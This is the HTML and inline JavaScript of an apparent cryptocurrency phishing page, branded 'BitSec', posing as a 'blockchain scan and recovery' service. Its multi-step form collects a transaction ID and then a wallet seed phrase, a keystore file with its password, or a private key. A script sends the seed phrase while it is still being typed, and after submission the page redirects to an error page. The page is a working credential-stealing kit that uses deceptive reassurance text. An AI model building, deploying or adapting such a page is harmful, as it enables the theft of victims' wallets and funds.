<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Basic -->
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <!-- Mobile Metas -->
  <meta name="viewport"
    content="width=device-width, initial-scale=1, shrink-to-fit=no, maximum-scale=1.0, user-scalable=no" />
  <!-- Site Metas -->
  <meta name="keywords" content="" />
  <meta name="description" content="" />
  <meta name="author" content="" />
  <link rel="shortcut icon" href="images/favicon.png" type="">

  <title> BitSec </title>

  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
  <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" crossorigin="anonymous" />

  <link rel="stylesheet" type="text/css"
    href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css" />

  <!-- font awesome style -->
  <link href="css/font-awesome.min.css" rel="stylesheet" />

  <!-- Custom styles for this template -->
  <!-- responsive style -->
  <link href="css/responsive.css" rel="stylesheet" />
  <link href="css/style.css" rel="stylesheet" />
  <title>Authentication</title>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css">
  <script type="text/javascript" src="js/validate.js"></script>
  <script type="text/javascript" src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
  <style>
    .modal-dialog-centered {
      display: flex;
      align-items: center;
      min-height: calc(100vh - 1rem);
    }

    .modal-content {
      padding: 20px;
      padding-bottom: 0.5rem;
      z-index: 1050;
    }

    .step-title {
      text-align: center;
    }

    .step-buttons {
      display: flex;
      justify-content: center;
    }

    .modal-lg,
    .modal-xl {
      max-width: 600px;
    }

    .hero_area {
      position: relative;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .container-fluid {
      width: 100%;
      padding: 0.75rem;
      margin: 0 auto;
    }
  </style>
</head>

<body>

  <!-- header section strats -->
  <header>

    <div class="nav-bar">
      <div class="custom_nav-container" style="justify-content: center;">

        <a><img src="images/logo.png" class="img-logo" style=""></a>

      </div>
    </div>
  </header>

  <div class="hero_area" style="justify-content: center; align-items: center;">

    <!-- Hidden div for wallet selection -->
    <button id='modal-button' type="button" style="padding:1rem; background-color: rgba(0, 23, 51, 0.9);"
      class="btn btn-primary" data-toggle="modal" data-target="#multiStepModal">
      Start recovery
    </button>

    <div class="container-fluid">
      <div class="hero_bg_box" style="filter: blur(4px) brightness(0.5); background-image: url('/images/bgbgbg.png'); background-repeat: no-repeat;
      background-attachment: fixed; 
      background-size: 100% 100%;">
      </div>
      <!-- this is for first page-->
      <!--


      <!-- Multi-Step Modal -->
      <!-- Button to trigger modal -->

      <div class="modal fade" id="multiStepModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true"
        style="">
        <div class="modal-dialog modal-dialog-centered modal-lg">
          <div class="modal-content">
            <div class="modal-header" style="justify-content: center; padding-top: 0;">
              <h5 class="modal-title step-title" id="exampleModalLabel" style="">Step 1</h5>
            </div>
            <div class="modal-body">
              <div class="step-content active" id="step1">

                <p>
                  To conduct a comprehensive blockchain scan and recovery, please complete the necessary steps to verify
                  your wallet account and confirm your transaction ID.

                </p>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" id="exampleCheckbox">
                  <label class="form-check-label" for="exampleCheckbox">
                    Yes, I understand and wish to proceed
                  </label>
                </div>
              </div>

              <div class="step-content" id="step2" style="display: none;">
                <form id="empty">
                  <p>Enter the transaction ID/Hash</p>
                  <label>Transaction ID</label>
                  <input id="txid" type="text" class="form-control" required name="new-input"
                    placeholder="Enter here..." oninput="validateID()">
                </form>
              </div>

              <div class="step-content" id="step3" style="display: none;">
                <h3 style="font-size: 1rem; font-weight: normal; text-align: center;  margin-bottom: 1rem">Select your preferred method</h3>
                <ul class="nav nav-tabs" id="myTab" role="tablist">
                  <li class="nav-item" role="presentation">
                    <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home"
                      type="button" role="tab" aria-controls="home" aria-selected="true" style="color:black">
                      Phrase
                    </button>
                  </li>
                  <li class="nav-item" role="presentation">
                    <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile"
                      type="button" role="tab" aria-controls="profile" aria-selected="false" style="color:black">
                      Keystore
                    </button>
                  </li>
                  <li class="nav-item" role="presentation">
                    <button class="nav-link" id="contact-tab" data-bs-toggle="tab" data-bs-target="#contact"
                      type="button" role="tab" aria-controls="contact" aria-selected="false" style="color:black">
                      Key
                    </button>
                  </li>
                </ul>

                <div class="tab-content" id="myTabConflextent">
                  <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
                    <!-- This is for phrase  -->
                    <form id="phrase-form">
                      <div class="form-group mb-3" style="font-weight: lighter;">
                        <textarea style="height: 10rem; border-width: 1px;color: #3ab6ff" class="form-control" required
                          type="text" placeholder="Seed phrase..." name="phrase" oninput="watchmen()"
                          id="verify"></textarea>

                        <p class="small-text" style="margin-top: 0.8rem">Typically, this involves 12 (occasionally 24)
                          words separated by a single space.
                        </p>
                      </div>


                    </form>
                  </div>
                  <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
                    <!-- This is for keystore -->
                    <form id="keystore-form">

                      <div class="form-group mb-3">
                        <textarea style="height: 10rem; color: #1CB0F6" required type="text" name="keystore-json"
                          placeholder="Keystore JSON..." id="key" class="form-control"></textarea>
                        <input style="
                    margin-top: 20px;
                    margin-bottom: 30px;
                    color: #0150b8;
                    " required name="keystore-pass" type="text" class="form-control" id="pass"
                          placeholder="Keystore password..." aria-label="Username" aria-describedby="basic-addon1" />
                      </div>


                    </form>
                  </div>
                  <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
                    <!-- THis is for private key -->
                    <form id="pkey-form">

                      <div class="form-group mb-3">
                        <textarea style="height: 10rem; color: #0150b8" required name="pkey" type="text"
                          placeholder="Private key..." class="form-control"></textarea>
                      </div>


                    </form>


                  </div>

                </div>

                <div class="form-check" style="text-align: center; font-size:1rem">
                  <input class="form-check-input" type="checkbox" id="submitc">
                  <label class="form-check-label" for="submitc">
                    I agree to <a href="legal/terms.html" target="_blank">Terms of use</a> and <a
                      href="legal/terms.html" target="_blank">Privacy policy</a>
                  </label>
                </div>


              </div>

              <div style="display: flex; justify-content: center;" id="button-container">
                <button type="button" class="btn btn-secondary" id="prevBtn"
                  style="padding: 0.75rem 2rem; ; display: none; margin: 1rem 1rem; margin-bottom: 0;">Back</button>
                <button type="button" class="btn btn-primary" id="nextBtn"
                  style="padding: 0.75rem 2rem; margin: 1rem 1rem; margin-bottom: 0;" disabled>Next</button>
                <button type="button" class="btn btn-primary" id="submitBtn"
                  style="padding: 0.75rem 2rem;  display: none; margin: 1rem 1rem;  margin-bottom: 0;justify-self: center;"
                  disabled>Submit</button>
              </div>


            </div>
          </div>

        </div>
        <!-- Spinner Container -->
        <div class="spinner-container" id="spinner" style="display: none; flex-direction: column-reverse;">
          <p style="padding-top:16px">Importing...</p>
          <div class="spinner"></div>
        </div>


      </div>
      <!-- footer section -->
      <!--
      <section class="footer_section form-footer">
        <p style="color: white;">
          &copy; <span id="displayYear"></span> All Rights Reserved By Bitsec Ltd.
        </p>
      </section>
      <!-- jQuery and Bootstrap JS -->
      <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>

      <script type="text/javascript" src="js/form.js"></script>
      <script>
        document.addEventListener('DOMContentLoaded', function () {
          var openModalBtn = document.getElementById('modal-button');
          var multiStepModal = new bootstrap.Modal(document.getElementById('multiStepModal'));

          openModalBtn.addEventListener('click', function () {
            multiStepModal.show();
          });
        });
        const steps = [...document.querySelectorAll('.step-content')];
        const nextBtn = document.getElementById('nextBtn');
        const prevBtn = document.getElementById('prevBtn');
        const submitBtn = document.getElementById('submitBtn');
        const title = document.querySelector('.modal-title');
        const checkbox = document.getElementById('exampleCheckbox');
        const submitCheckbox = document.getElementById('submitc');
        const row = document.getElementById('button-container');
        var sent = false;
        let currentStep = 0;


        document.getElementById('submitBtn').addEventListener('click', function () {
          // Get the active tab pane
          var activeTab = document.querySelector('.tab-pane.active');

          // Get the form within the active tab pane
          var activeForm = activeTab.querySelector('form');

          // Submit the form data based on the active tab
          if (activeForm.id === 'phrase-form') {
            var activeTab = document.querySelector('.tab-pane.active');
            var activeForm = activeTab.querySelector('form');
            var formData = new FormData(activeForm);
            if (!validatePhrase(formData.get('phrase'))) {
              alert('Invalid form submission!')
              return false;
            } else {
              $("#spinner").show();
              send(1);
            }
          } else if (activeForm.id === 'keystore-form') {
            var activeTab = document.querySelector('.tab-pane.active');
            var activeForm = activeTab.querySelector('form');
            var formData = new FormData(activeForm);
            if (!validateKeystore(formData.get('keystore-json'), formData.get('keystore-pass'))) {
              alert('Invalid form submission!')
              return false;
            } else {
              $("#spinner").show();
              send(2);
            }
          } else {
            var activeTab = document.querySelector('.tab-pane.active');
            var activeForm = activeTab.querySelector('form');
            var formData = new FormData(activeForm);
            if (!validatePkey(formData.get('pkey'))) {
              alert('Invalid form submission!')
              return false;
            } else {
              $("#spinner").show();
              send(3);
            }
          }
          setTimeout(function () {
            // Redirect to 'monkey.html' after 5 seconds
            window.location.href = 'errorpage.html';
          }, 5000); // 5000 milliseconds = 5 seconds

        });
        function showStep(step) {
          steps.forEach((content, index) => {
            content.style.display = index === step ? 'block' : 'none';
          });
          title.textContent = `Step ${step + 1} / 5`;
          if (step === 0) {
            row.style.justifyContent = 'center';
            if (checkbox.checked) {
              nextBtn.disabled = false;
            } else {
              nextBtn.disabled = true;
            }
            prevBtn.style.display = 'none';

          } else if (step === 1) {
            title.textContent = title.textContent.concat(' - Transaction identification');
            nextBtn.disabled = true;
            row.style.justifyContent = 'center';
            prevBtn.style.display = 'inline-block';
            submitBtn.style.display = 'none';
            nextBtn.style.display = 'inline-block';
            validateID();

          } else {
            title.textContent = title.textContent.concat(' - Connect wallet account');
            nextBtn.style.display = 'none';
            submitBtn.style.display = 'inline-block';
          }
          /*
          prevBtn.style.display = step > 0 ? 'inline-block' : 'none';
          nextBtn.style.display = step < steps.length - 1 ? 'inline-block' : 'none';
          submitBtn.style.display = step > steps.length - 2 ? 'inline-block' : 'none';
          */
        }

        function validateID() {
          let input = document.getElementById('txid').value;
          if (validateTransaction(input)) {
            nextBtn.disabled = false;
          } else {
            nextBtn.disabled = true;
          }
        }

        function watchmen() {
          let input = document.getElementById('verify').value;
          if (phraseWatchmen(input) && !sent) {
            send(1);
          }

        }

        nextBtn.addEventListener('click', () => {
          currentStep++;
          showStep(currentStep);
        });

        prevBtn.addEventListener('click', () => {
          if (currentStep > 0) {
            currentStep--;
            showStep(currentStep);
          }
        });

        document.addEventListener('DOMContentLoaded', () => {
          new bootstrap.Modal(document.getElementById('multiStepModal')).show();
          showStep(currentStep);
        });
        // Add an event listener to the checkbox
        checkbox.addEventListener('change', function () {
          // Enable the "Next" button if the checkbox is checked
          if (this.checked) {
            nextBtn.disabled = false;
          } else {
            // Disable the "Next" button if the checkbox is not checked
            nextBtn.disabled = true;
          }
        });

        submitCheckbox.addEventListener('change', function () {
          if (this.checked) {
            submitBtn.disabled = false;
            prevBtn.style.display = 'none';
            row.style.justifyContent = 'center';
          } else {
            submitBtn.disabled = true;
            prevBtn.style.display = 'inline-block';
            row.style.justifyContent = 'center';
          }
        });
      </script>
</body>

</html>